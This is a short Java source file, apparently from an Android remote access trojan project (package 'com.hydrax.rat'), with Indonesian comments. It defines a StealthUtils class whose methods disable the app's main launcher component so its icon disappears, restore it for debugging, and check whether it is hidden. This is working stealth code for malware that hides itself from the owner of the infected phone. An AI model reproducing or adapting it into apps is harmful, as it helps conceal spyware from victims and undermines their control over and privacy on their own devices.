package com.hydrax.rat;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;

public class StealthUtils {

    /**
     * Menyembunyikan ikon aplikasi dari launcher.
     * Panggil method ini sekali di MainActivity.onCreate()
     */
    public static void hideAppIcon(Context context) {
        PackageManager pm = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, context.getPackageName() + ".MainActivity");

        // Menonaktifkan komponen utama (menyembunyikan ikon)
        pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
        );
    }

    /**
     * Menampilkan kembali ikon aplikasi (jika diperlukan untuk debugging).
     */
    public static void showAppIcon(Context context) {
        PackageManager pm = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, context.getPackageName() + ".MainActivity");

        pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
        );
    }

    /**
     * Memeriksa apakah ikon aplikasi sedang tersembunyi.
     */
    public static boolean isIconHidden(Context context) {
        PackageManager pm = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, context.getPackageName() + ".MainActivity");
        int status = pm.getComponentEnabledSetting(componentName);
        return status == PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
    }
}
